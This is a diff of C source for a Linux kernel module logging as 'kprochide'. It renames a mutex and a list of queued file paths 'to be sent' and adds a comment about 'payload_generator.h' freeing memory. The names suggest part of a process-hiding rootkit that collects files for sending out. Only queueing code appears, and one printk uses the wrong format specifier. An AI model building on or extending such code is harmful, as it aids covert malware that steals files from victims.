@@ -3,7 +3,7 @@
 #include <linux/fs.h>
 #include <linux/slab.h>
 
-DEFINE_MUTEX(files_to_send_mutex);
+DEFINE_MUTEX(pending_files_to_be_sent_mutex);
 
 static int device_open_count = 0;
 
@@ -13,7 +13,7 @@ static int device_release(struct inode* inode, struct file* file);
 static ssize_t device_read(struct file *fs, char *buffer, size_t len, loff_t *offset);
 static ssize_t device_write(struct file *fs, const char*buffer, size_t len, loff_t *offset);
 
-LIST_HEAD(files_to_send);
+LIST_HEAD(pending_files_to_be_sent);
 
 static struct file_operations _file_ops = {
     .read = device_read,
@@ -39,7 +39,8 @@ static ssize_t device_write(struct file *fs, const char *buffer, size_t len, lof
         return -EIO;
     }
 
-    // allocate space for the path and save it to our file_info struct
+    // allocate space for the path and save it to our file_info struct.
+    // payload_generator.h is the one responsible for freeing the allocated memory.
     char* file_path = (char*)kmalloc(len, GFP_KERNEL);
     if (NULL == file_path) {
         return -EIO;
@@ -48,10 +49,10 @@ static ssize_t device_write(struct file *fs, const char *buffer, size_t len, lof
 
     new_file_info->file_path = file_path;
 
-    mutex_lock(&files_to_send_mutex);
+    mutex_lock(&pending_files_to_be_sent_mutex);
     INIT_LIST_HEAD(&new_file_info->l_head);
-    list_add_tail(&new_file_info->l_head, &files_to_send);
-    mutex_unlock(&files_to_send_mutex);
+    list_add_tail(&new_file_info->l_head, &pending_files_to_be_sent);
+    mutex_unlock(&pending_files_to_be_sent_mutex);
 
     printk(KERN_INFO "kprochide: new file to send: %d\n", file_path);
 
